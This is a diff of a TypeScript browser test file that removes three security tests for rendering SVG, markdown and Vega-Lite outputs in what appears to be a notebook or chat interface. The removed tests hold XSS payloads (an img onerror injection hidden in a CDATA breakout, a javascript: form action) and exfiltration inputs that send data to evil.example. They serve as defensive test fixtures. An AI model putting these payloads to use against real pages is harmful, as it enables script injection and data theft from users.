@@ -126,36 +126,6 @@ test('an inlined html output cannot draw over the page', async () => {
   assert.deepEqual(got, { covered: false, cls: null, style: 'background-color: red;' })
 })
 
-test('an svg figure keeps its drawing, runs nothing and loads nothing from another host', async () => {
-  const svg = `<?xml version="1.0" encoding="utf-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100pt" height="50pt" viewBox="0 0 100 50">
- <defs><style type="text/css">*{stroke-linejoin: round; stroke-linecap: butt} body { display: none }</style></defs>
- <div xmlns="http://www.w3.org/1999/xhtml"><xmp><![CDATA[</xmp><img src="x" onerror="window.__pwned = 'xmp'">]]></xmp><form action="javascript:window.__pwned = 'form'"><button id="svgbtn">b</button></form></div>
- <g id="figure_1"><path id="p1" d="M 0 0 L 10 10" style="stroke: #000000"/></g>
- <image xlink:href="https://evil.example/svg.png" width="5" height="5"/>
- <image id="embedded" xlink:href="data:image/png;base64,iVBORw0KGgo=" width="5" height="5"/>
-</svg>`
-  const id = await output({ 'image/svg+xml': svg })
-  await settle()
-  const seen = await page.evaluate((id) => {
-    const el = document.getElementById(id)!
-    el.querySelector<HTMLElement>('#svgbtn')?.click()
-    const root = el.querySelector('svg')
-    return {
-      path: !!el.querySelector('path'),
-      styles: document.querySelectorAll('style').length,
-      html: !!el.querySelector('xmp, form, button, img') || !!root?.querySelector('div'),
-      rootStyle: root?.getAttribute('style') ?? '',
-      images: Array.from(el.querySelectorAll('image')).map((i) => (i.getAttribute('href') ?? i.getAttribute('xlink:href') ?? '').slice(0, 10)),
-    }
-  }, id)
-  await settle(200)
-  assert.equal(await pwned(), null)
-  // the remote image keeps its element with no address; the embedded one keeps its data: URL
-  assert.deepEqual({ ...seen, rootStyle: /stroke-linejoin: round; stroke-linecap: butt/.test(seen.rootStyle), images: seen.images.filter(Boolean) }, { path: true, styles: 0, html: false, rootStyle: true, images: ['data:image'] })
-  assert.deepEqual(leaks(), [])
-})
-
 test('an svg figure cannot draw over the page', async () => {
   const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="100pt" height="50pt" viewBox="0 0 100 50" overflow="visible" style="position: fixed; inset: 0; z-index: 2147483647; transform: translate(0, 0); stroke-linecap: butt">
  <rect x="-5000" y="-5000" width="10000" height="10000" fill="red"/>
@@ -180,42 +150,4 @@ test('an svg figure cannot draw over the page', async () => {
   }, id)
   await sheet.evaluate((node) => node.parentNode?.removeChild(node))
   assert.deepEqual(got, { corner: false, beside: false, inside: true, style: 'stroke-linecap: butt' })
-})
-
-test('a markdown image from another host is its alt text, in an output and in the chat', async () => {
-  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/mini/media?path=a.png)'
-  for (const where of ['output', 'chat']) {
-    const id = where === 'output' ? await output({ 'text/markdown': md }) : await page.evaluate((text) => (window as any).__t.chat(text), md)
-    await settle(200)
-    const seen = await page.evaluate((id) => {
-      const el = document.getElementById(id)!
-      return { srcs: Array.from(el.querySelectorAll('img')).map((i) => (i.getAttribute('src') ?? '').slice(0, 10)), text: el.textContent ?? '' }
-    }, id)
-    assert.deepEqual(seen.srcs, ['/api/ws/mi'], where)
-    assert.match(seen.text, /leak/, where)
-  }
-  assert.deepEqual(leaks(), [])
-})
-
-test('a Vega chart fetches no URL but a data: one, and a spec cannot hand it a loader of its own', async () => {
-  const enc = { x: { field: 'a', type: 'nominal' }, y: { field: 'b', type: 'quantitative' } }
-  const remote = {
-    $schema: 'https://vega.github.io/schema/vega-lite/v5.json',
-    data: { url: 'https://evil.example/data.json' },
-    mark: 'bar',
-    encoding: enc,
-    usermeta: { embedOptions: { loader: { baseURL: 'https://evil.example/' }, config: 'https://evil.example/config.json' } },
-  }
-  const viaData = { $schema: 'https://vega.github.io/schema/vega-lite/v5.json', data: { url: 'data:application/json,' + encodeURIComponent('[{"a":"x","b":2},{"a":"y","b":3}]'), format: { type: 'json' } }, mark: 'bar', encoding: enc }
-  const idRemote = await output({ 'application/vnd.vegalite.v5+json': remote })
-  const idData = await output({ 'application/vnd.vegalite.v5+json': viaData })
-  let bars = 0
-  for (let i = 0; i < 50 && !bars; i++) {
-    await settle(100)
-    bars = await page.evaluate((id) => document.querySelectorAll(`#${id} .mark-rect path`).length, idData)
-  }
-  await settle(300)
-  assert.equal(bars, 2, 'a chart whose data is a data: URL draws')
-  assert.ok(await page.evaluate((id) => !!document.getElementById(id), idRemote))
-  assert.deepEqual(leaks(), [])
 })
